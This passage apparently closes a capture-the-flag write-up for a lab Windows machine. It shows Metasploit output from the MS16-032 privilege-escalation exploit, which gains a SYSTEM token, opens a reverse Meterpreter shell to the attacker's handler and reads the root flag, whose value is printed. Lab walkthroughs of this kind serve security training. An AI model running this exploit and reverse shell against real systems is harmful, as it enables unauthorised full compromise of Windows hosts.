msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.x.x:4646 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\uenODdmaCwwNK.ps1...
[*] Compressing script contents...
[+] Compressed size: 3600
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1176

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1232
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

TJn8TusTEgQYWSVvMHKkkWIl2Ff4BM8N
[+] Executed on target machine.
[*] Sending stage (176195 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.x.x:4646 -> 10.10.10.8:49205) at 2021-01-17 14:27:43 +0800
[+] Deleted C:\Users\kostas\AppData\Local\Temp\uenODdmaCwwNK.ps1
...
meterpreter > dir
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-03-18 19:52:56 +0800  desktop.ini
100444/r--r--r--  32    fil   2017-03-18 20:13:57 +0800  root.txt

meterpreter > cat root.txt
51ed1b36553c8461f4552c2e92b3eeed
```
System flag achieved!
